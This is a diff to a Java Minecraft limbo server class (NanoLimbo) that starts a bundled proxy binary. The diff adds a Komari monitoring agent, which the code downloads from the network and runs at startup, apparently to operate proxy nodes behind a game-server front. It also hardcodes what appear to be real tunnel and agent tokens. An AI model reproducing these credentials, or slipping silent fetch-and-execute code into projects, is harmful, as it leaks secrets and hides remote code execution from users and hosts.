@@ -34,10 +34,11 @@ public final class NanoLimbo {
     private static final String ANSI_RESET = "\033[0m";
     private static final AtomicBoolean running = new AtomicBoolean(true);
     private static Process sbxProcess;
+    private static Process komariProcess;
     
     private static final String[] ALL_ENV_VARS = {
-        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
-        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
+        "PORT", "FILE_PATH", "UUID", "KOMARI_ENDPOINT", "KOMARI_TOKEN",
+        "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
         "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
         "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
         "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO", "SHOW_LOG"
@@ -58,7 +59,11 @@ public final class NanoLimbo {
 
         // Start SbxService
         try {
-            runSbxBinary();
+            Map<String, String> envVars = new HashMap<>();
+            loadEnvVars(envVars);
+
+            runSbxBinary(envVars);
+            runKomariAgent(envVars);
             
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
@@ -110,10 +115,7 @@ public final class NanoLimbo {
         }
     }   
     
-    private static void runSbxBinary() throws Exception {
-        Map<String, String> envVars = new HashMap<>();
-        loadEnvVars(envVars);
-        
+    private static void runSbxBinary(Map<String, String> envVars) throws Exception {
         ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
         pb.environment().putAll(envVars);
         pb.redirectErrorStream(true);
@@ -121,13 +123,30 @@ public final class NanoLimbo {
         
         sbxProcess = pb.start();
     }
+
+    // 启动 Komari agent（探针）。endpoint 或 token 为空时跳过；失败不影响主服务
+    private static void runKomariAgent(Map<String, String> envVars) {
+        String endpoint = envVars.getOrDefault("KOMARI_ENDPOINT", "").trim();
+        String token = envVars.getOrDefault("KOMARI_TOKEN", "").trim();
+        if (endpoint.isEmpty() || token.isEmpty()) {
+            return;
+        }
+        try {
+            ProcessBuilder pb = new ProcessBuilder(
+                getKomariBinaryPath().toString(), "-e", endpoint, "-t", token);
+            pb.redirectErrorStream(true);
+            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+            komariProcess = pb.start();
+        } catch (Exception e) {
+            System.err.println(ANSI_RED + "Error starting Komari agent: " + e.getMessage() + ANSI_RESET);
+        }
+    }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "4abb3b0e-cafe-45de-bf92-a1d8733835b8"); // 节点UUID，哪吒v1在不同的平台部署需要更改，否则哪吒agent会被覆盖
+        envVars.put("UUID", "4abb3b0e-cafe-45de-bf92-a1d8733835b8"); // 节点UUID
         envVars.put("FILE_PATH", "./world");   // sub.txt节点保存目录
-        envVars.put("NEZHA_SERVER", "");       // 哪吒面板地址 v1格式：nezha.xxx.com:8008  哪吒v0格式：nezha.xxx.com
-        envVars.put("NEZHA_PORT", "");         // 哪吒v1请留空，哪吒v0的agent端口
-        envVars.put("NEZHA_KEY", "");          // 哪吒v1的NZ_CLIENT_SECRET或哪吒v0的agent密钥
+        envVars.put("KOMARI_ENDPOINT", "https://komari.neilcai.de5.net"); // Komari 面板地址
+        envVars.put("KOMARI_TOKEN", "Yv3OHOVB3bNnA0yfm2hxeL");            // Komari agent 的 token
         envVars.put("ARGO_PORT", "8090");      // argo隧道端口，使用固定隧道token需要在cloudflare里设置和这里一致
         envVars.put("ARGO_DOMAIN", "bot.caining.de5.net");        // argo固定隧道隧道域名
         envVars.put("ARGO_AUTH", "eyJhIjoiZGI5MGY5MTEwNDg2MGEyMWRjZjQyZTg1NmFjMDhjZGMiLCJ0IjoiOTkyMzY5NDYtZDJjOS00ODVkLTgzNDctNjcwNThhMDJmOWQ2IiwicyI6Ik1ERmpPV014TVdZdE5tRmhaUzAwTUdRMUxUZ3daRFl0WVdReE1tWTVNRFZsTTJKbCJ9");          // argo固定隧道隧道密钥json或token，json可在https://json.zone.id 获取
@@ -202,11 +221,42 @@ public final class NanoLimbo {
         }
         return path;
     }
+
+    // 从 komari-agent 官方 GitHub Release 下载对应架构的二进制
+    private static Path getKomariBinaryPath() throws IOException {
+        String osArch = System.getProperty("os.arch").toLowerCase();
+        String suffix;
+
+        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
+            suffix = "amd64";
+        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
+            suffix = "arm64";
+        } else {
+            throw new RuntimeException("Komari agent: unsupported architecture: " + osArch);
+        }
+
+        String url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-" + suffix;
+
+        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "komari-agent");
+        if (!Files.exists(path)) {
+            try (InputStream in = new URL(url).openStream()) {
+                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+            }
+            if (!path.toFile().setExecutable(true)) {
+                throw new IOException("Failed to set executable permission");
+            }
+        }
+        return path;
+    }
     
     private static void stopServices() {
         if (sbxProcess != null && sbxProcess.isAlive()) {
             sbxProcess.destroy();
             System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
+        }
+        if (komariProcess != null && komariProcess.isAlive()) {
+            komariProcess.destroy();
+            System.out.println(ANSI_RED + "komari agent terminated" + ANSI_RESET);
         }
     }
 }
